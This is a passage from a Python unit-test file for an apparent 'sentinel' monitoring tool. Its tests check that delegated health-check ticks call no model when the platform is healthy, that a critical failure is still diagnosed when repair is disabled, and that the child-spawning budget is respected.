        specs, why = SS.plan_children(dict(cfg, daily_child_budget=3), history, 0)
        self.assertEqual([], specs)
        self.assertIn("child budget spent", why)


# ── the tick keeps ticking ──────────────────────────────────────────────────
class TickDelegationTests(unittest.TestCase):
    """Requirement 1: a delegated tick spends no model on art, and still
    diagnoses a critical platform failure."""

    def setUp(self):
        self.home = scratch_dir("tick")
        (self.home / "state").mkdir()
        (self.home / "logs").mkdir()
        for name, value in (("STATE", self.home / "state"),
                            ("LOGS", self.home / "logs"),
                            ("STOP", self.home / "STOP")):
            p = mock.patch.object(sentinel, name, value)
            p.start()
            self.addCleanup(p.stop)
        for name in ("notify", "refresh_dashboard", "publish_head_hook"):
            if hasattr(sentinel, name):
                p = mock.patch.object(sentinel, name, mock.Mock())
                p.start()
                self.addCleanup(p.stop)
        p = mock.patch.object(sentinel, "NB", mock.MagicMock())
        p.start()
        self.addCleanup(p.stop)
        p = mock.patch.object(sentinel, "outsider_smoke", return_value=False)
        p.start()
        self.addCleanup(p.stop)
        p = mock.patch.object(sentinel, "config", return_value={
            **sentinel.DEFAULTS, "level": 3, "notify": False,
            "repair_enabled": False,
            "evolve_worker": {"enabled": True},
        })
        p.start()
        self.addCleanup(p.stop)

    def tearDown(self):
        shutil.rmtree(self.home, ignore_errors=True)

    def test_enabled_flag_reads_the_block(self):
        self.assertTrue(sentinel.evolution_worker_enabled(
            {"evolve_worker": {"enabled": True}}))
        self.assertFalse(sentinel.evolution_worker_enabled(
            {"evolve_worker": {"enabled": False}}))
        self.assertFalse(sentinel.evolution_worker_enabled({}))
        self.assertFalse(sentinel.evolution_worker_enabled(
            {"evolve_worker": "yes"}))

    def test_a_healthy_delegated_tick_invokes_no_model(self):
        with mock.patch.object(sentinel, "run_health", return_value=healthy()), \
             mock.patch.object(sentinel, "evolve") as evolve, \
             mock.patch.object(sentinel, "escalate") as escalate:
            self.assertEqual(0, sentinel.main())
        evolve.assert_not_called()
        escalate.assert_not_called()

    def test_a_delegated_tick_still_diagnoses_a_critical_failure(self):
        verdict = {"status": "critical", "failed": ["rb_frontdoor"],
                   "critical": ["rb_frontdoor"], "checks": [], "summary": "down"}
        with mock.patch.object(sentinel, "run_health", return_value=verdict), \
             mock.patch.object(sentinel, "evolve") as evolve, \
             mock.patch.object(sentinel, "escalate",
                               return_value=(True, "SENTINEL_RESULT: BLOCKED x")) as esc:
            self.assertEqual(0, sentinel.main())
        evolve.assert_not_called()
        esc.assert_called_once()
        self.assertEqual("diagnose", esc.call_args.args[3],
                         "repair_enabled=false must still be honored")


if __name__ == "__main__":
    unittest.main()
